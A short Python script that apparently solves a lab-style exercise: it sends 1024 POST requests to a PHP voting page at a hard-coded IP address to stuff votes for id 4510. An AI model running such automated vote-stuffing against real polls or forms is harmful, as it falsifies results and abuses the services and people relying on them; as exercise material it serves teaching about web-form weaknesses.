#!/usr/bin/python3
# 1024.py
"""Script that votes 1024 for id 4510"""
import requests

php = "http://158.69.76.135/level0.php"
vote = {
    "id": "4510",
    "holdthedoor": "Submit"
}

if __name__ == "__main__":
    for i in range(0, 1024):
        requests.post(php, data=vote)
